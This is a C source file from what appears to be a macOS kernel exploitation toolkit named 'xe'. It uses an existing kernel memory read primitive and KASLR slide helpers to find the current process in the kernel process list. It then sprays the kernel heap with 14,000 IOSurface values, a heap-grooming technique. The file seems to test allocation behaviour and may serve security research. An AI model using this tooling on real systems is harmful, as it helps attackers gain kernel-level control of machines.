//
//  main.c
//  xe
//
//  Created by admin on 11/20/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/sysctl.h>
#include <sys/errno.h>
#include <sys/socket.h>
#include <dispatch/dispatch.h>
#include <gym_client.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "util_lock.h"
#include "kmem.h"
#include "slider.h"
#include "allocator_pipe.h"
#include "allocator_iosurface.h"
#include "platform_types.h"
#include "platform_variables.h"

#include "util_binary.h"
#include "xnu_proc.h"


int main(int argc, const char * argv[]) {
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));

    uintptr_t proc;
    int error = xe_xnu_proc_find(kernproc, getpid(), &proc);
    if (error) {
        printf("[ERROR] cannot find current proc, err: %d\n", error);
        return error;
    }
    
    printf("[INFO] pid: %d\n", getpid());
    printf("[INFO] proc: %p\n", (void*)proc);
    
    getpass("press enter to begin allocation using IOSurface\n");
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    
    for (int i=0; i<14000; i++) {
        printf("%d\n", i);
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "key_%d", i);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
        IOSurfaceSetValue(surface, key, value);
        CFRelease(key);
        CFRelease(value);
    }
    
    CFRelease(props);
    CFRelease(alloc_size_cfnum);
    IOSurfaceRemoveAllValues(surface);
    IOSurfaceDecrementUseCount(surface);
    
    return 0;
}
